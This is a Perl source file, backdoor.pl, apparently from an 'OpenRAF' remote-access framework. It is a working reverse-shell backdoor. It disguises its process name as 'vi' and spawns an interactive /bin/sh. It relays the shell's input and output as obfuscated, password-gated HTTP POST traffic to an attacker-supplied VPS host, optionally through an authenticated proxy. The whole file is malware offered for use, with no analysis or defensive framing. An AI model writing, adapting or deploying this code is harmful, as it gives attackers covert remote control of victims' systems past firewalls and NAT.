#!/usr/bin/perl

#
#  backdoor.pl
#  OpenRAF
#
#  Created by Ivan Nikolsky on 2020.
#  Copyright © 2020 Ivan Nikolsky. All rights reserved.
#

# (1) Attacker ------ (2) OpenRAF ------+
#                                       |                                     (8) Back Connect
#                               (3) OpenRAF VPS ------ (4) OpenRAF ARS -------------------------------------+
#                                                            |                                              |
#                                                            +------ (5) NAT ------+ Firewall +------ (7) Target 
#                                                                                  |          |
#                                                                                  +----------+
#                                                                                (6) OpenRAF AVB

if ($ARGV[0] eq "") {
    print STDOUT "Usage: backdoor.pl [vps_host] [vps_port]\n";
    exit(0);
}

$MODE="POST";
$CGI_PREFIX="/cgi-bin/orderform";
$MASK="vi";
$PASSWORD="THC";

$LISTEN_PORT=$ARGV[1];
$SERVER=$ARGV[0];

$SHELL="/bin/sh -i";
$DELAY="3";
#$TIME="14:39";		# time when to connect to the ars (unset if now)
#$DAILY="yes";		# tries to connect once daily if set with something
#$PROXY="127.0.0.1";	# set this with the Proxy if you must use one
#$PROXY_PORT="3128";	# set this with the Proxy Port if you must use one
#$PROXY_USER="user";	# username for proxy authentication
#$PROXY_PASSWORD="pass";# password for proxy authentication
#$DEBUG="yes";		# for debugging purpose, turn off when in production
$BROKEN_RECV="yes";

require 5.002;
use Socket;

$|=1;
if ($MASK) { for ($a=1;$a<80;$a++){$MASK=$MASK."\000";}  $0=$MASK; }
undef $DAILY   if (! $TIME);
if ( !($PROXY) || !($PROXY_PORT) ) {
	undef $PROXY;
	undef $PROXY_PORT;
}
$protocol = getprotobyname('tcp');

print STDOUT "starting in ars mode\n";
$ARS_MODE = "yeah";

if ($MODE ne "GET" && $MODE ne "POST") {
	print STDOUT "Error: MODE must either be GET or POST, re-edit this perl config\n";
	exit(-1);
}

&ars;

sub ars {
	$pid = 0;
	$PROXY_SUFFIX = "Host: " . $SERVER . "\r\nUser-Agent: Mozilla/4.0\r\nAccept: text/html, text/plain, image/jpeg, image/*;\r\nAccept-Language: en\r\n";
	if ($PROXY) {		# setting the real config (for Proxy Support)
		$REAL_SERVER = $PROXY;
		$REAL_PORT = $PROXY_PORT;
		$REAL_PREFIX = $MODE . " http://" . $SERVER . ":" . $LISTEN_PORT
			. $CGI_PREFIX;
		$PROXY_SUFFIX = $PROXY_SUFFIX . "Pragma: no-cache\r\n";
		if ( $PROXY_USER && USER_PASSWORD ) {
			&base64encoding;
			$PROXY_SUFFIX = $PROXY_SUFFIX . $PROXY_COOKIE;
		}
	} else {
		$REAL_SERVER = $SERVER;
		$REAL_PORT = $LISTEN_PORT;
		$REAL_PREFIX = $MODE . " " . $CGI_PREFIX;
	}
	$REAL_PREFIX = $REAL_PREFIX . "?"	if ($MODE eq "GET");
	$REAL_PREFIX = $REAL_PREFIX . " HTTP/1.0\r\n"	if ($MODE eq "POST");
AGAIN:	if ($pid) { kill 9, $pid; }
	if ($TIME) {			
		$TIME =~ s/^0//;	$TIME =~ s/:0/:/;
		(undef,$min,$hour,undef,undef,undef,undef,undef,undef)
			= localtime(time);
		$t=$hour . ":" . $min;
		while ($TIME ne $t) {
			sleep(28); 
			(undef,$min,$hour,undef,undef,undef,undef,undef,undef)
				= localtime(time);
			$t=$hour . ":" .$min;
		}
	}
	print STDERR "ARS activated\n"	if $DEBUG;
	if ($DAILY) {			
		if (fork) {		
			sleep(69);	
			goto AGAIN;	
		}			
	print STDERR "forked\n" if $DEBUG;
	}
	$address = inet_aton($REAL_SERVER) || die "can't resolve server\n";
	$remote = sockaddr_in($REAL_PORT, $address);
	$forked = 0;
GO:	close(THC);
	socket(THC, &PF_INET, &SOCK_STREAM, $protocol)
		or die "can't create socket\n";
	setsockopt(THC, SOL_SOCKET, SO_REUSEADDR, 1);
	if (! $forked) {		
		pipe R_IN, W_IN;        select W_IN;  $|=1;
		pipe R_OUT, W_OUT;      select W_OUT; $|=1;
		$pid = fork;
		if (! defined $pid) {
			close THC;
			close R_IN;	close W_IN;
			close R_OUT;	close W_OUT;
			goto GO;
		}
		$forked = 1;
	}
	if (! $pid) {           
		close R_OUT;	close W_IN;	close THC;
		print STDERR "forking $SHELL in child\n"	if $DEBUG;
		open STDIN,  "<&R_IN";
		open STDOUT, ">&W_OUT";
		open STDERR, ">&W_OUT";
		exec $SHELL || print W_OUT "couldn't spawn $SHELL\n";
		close R_IN;     close W_OUT;
		exit(0);
	} else {                
		close R_IN;
		sleep($DELAY);	
		vec($rs, fileno(R_OUT), 1) = 1;
		print STDERR "before: allwritten2stdin\n"	if $DEBUG;
		select($r = $rs, undef, undef, 30);
		print STDERR "after : wait for allwritten2stdin\n" if $DEBUG;
		sleep(1);	
		$output = "";	
		vec($ws, fileno(W_OUT), 1) = 1;
		print STDERR "before: readwhiledatafromstdout\n"   if $DEBUG;
		while (select($w = $ws, undef, undef, 1)) {
			read R_OUT, $readout, 1 || last;
			$output = $output . $readout;
		}
		print STDERR "after : readwhiledatafromstdout\n"   if $DEBUG;
		print STDERR "before: fucksunprob\n"	if $DEBUG;
		vec($ws, fileno(W_OUT), 1) = 1;
		while (! select(undef, $w=$ws, undef, 0.001)) {
			read R_OUT, $readout, 1 || last;
			$output = $output . $readout;
		}
		print STDERR "after : fucksunprob\n"	if $DEBUG;
		print STDERR "send 0byte to stdout, fail->exit\n"   if $DEBUG;
		print W_OUT "\000" || goto END_IT;
		print STDERR "before: readallstdoutdatawhile!eod\n" if $DEBUG;
		while (1) {
			read R_OUT, $readout, 1 || last;
			last  if ($readout eq "\000");
			$output = $output . $readout;
		}
		print STDERR "after : readallstdoutdatawhile!eod\n" if $DEBUG;
		&uuencode;
		if ($MODE eq "GET") {
			$encoded = $REAL_PREFIX . $encoded . " HTTP/1.0\r\n";
			$encoded = $encoded . $PROXY_SUFFIX;
			$encoded = $encoded . "\r\n";
		} else {
			$encoded = $REAL_PREFIX . $PROXY_SUFFIX
			 . "Content-Type: application/x-www-form-urlencoded\r\n\r\n"
			 . $encoded . "\r\n";
		}
		print STDERR "connecting to remote, fail->exit\n" if $DEBUG;
		connect(THC, $remote) || goto END_IT;
		print STDERR "send encoded data, fail->exit\n" if $DEBUG;
		send (THC, $encoded, 0) || goto END_IT;
		$input = "";
		vec($rt, fileno(THC), 1) = 1;
		print STDERR "before: wait4answerfromremote\n"	if $DEBUG;
		while (! select($r = $rt, undef, undef, 0.00001)) {}
		print STDERR "after : wait4answerfromremote\n"	if $DEBUG;
		print STDERR "read data from socket until eod\n" if $DEBUG;
		$error="no";
			print STDERR "?"	if $DEBUG;
			recv (THC, $readin, 16386, 0) || undef $error;
			print STDERR "!"	if $DEBUG;
			goto OK  if (($readin eq "\000") or ($readin eq "\n")
				or ($readin eq ""));
			$input = $input . $readin;
OK:		print STDERR "\nall data read, entering OK\n"	if $DEBUG;
		print STDERR "RECEIVE: $input\n"	if $DEBUG;
		$input =~ s/.*\r\n\r\n//s;
		print STDERR "BEFORE DECODING: $input\n"	if $DEBUG;
		&uudecode;
		print STDERR "AFTER DECODING: $decoded\n"	if $DEBUG;
		print STDERR "if password not found -> exit\n"	if $DEBUG;
		goto END_IT	if ($decoded =~ m/^$PASSWORD/s == 0);
		$decoded =~ s/^$PASSWORD//;
		print STDERR "writing input data to $SHELL\n"	if $DEBUG;
		print W_IN "$decoded" || goto END_IT;
		sleep(1);
		print STDERR "jumping to GO\n"	if $DEBUG;
		goto GO;
	}
END_IT:	kill 9, $pid;	$pid = 0;
	exit(0);
}

sub uuencode {
	$output = $PASSWORD . $output;
        $uuencoded = pack "u", "$output";
        $uuencoded =~ tr/'\n)=(:;&><,#$*%]!\@"`\\\-'
                        /'zcadefghjklmnopqrstuv'
                        /;
        $uuencoded =~ tr/"'"/'b'/;
	if ( ($PROXY) && ($ARS_MODE) ) {
		$codelength = (length $uuencoded) + (length $REAL_PREFIX) +12;
		$cut_length = 4099 - (length $REAL_PREFIX);
		$uuencoded = pack "a$cut_length", $uuencoded
			if ($codelength > 4111);
	}
        $encoded = $uuencoded;
}

sub uudecode {
	$input =~     tr/'zcadefghjklmnopqrstuv'
			/'\n)=(:;&><,#$*%]!\@"`\\\-'
			/;
	$input =~     tr/'b'/"'"/;
	$decoded = unpack "u", "$input";
}

sub base64encoding {
	$encode_string = $PROXY_USER . ":" . $PROXY_PASSWORD;
	$encoded_string = substr(pack('u', $encode_string), 1);
	chomp($encoded_string);
	$encoded_string =~ tr|` -_|AA-Za-z0-9+/|;
	$padding = (3 - length($encode_string) % 3) % 3;
	$encoded_string =~ s/.{$padding}$/'=' x $padding/e if $padding;
	$PROXY_COOKIE = "Proxy-authorization: Basic " . $encoded_string . "\n";
}

sub hide_as_broken_webserver {
	send (S, "<HTML><HEAD>\r\n<TITLE>404 File Not Found</TITLE>\r\n</HEAD>".
		 "<BODY>\r\n<H1>File Not Found</H1>\r\n</BODY></HTML>\r\n", 0);
	close S;
	print STDOUT "Warning! Illegal server access!\n";
	goto YOP;
}
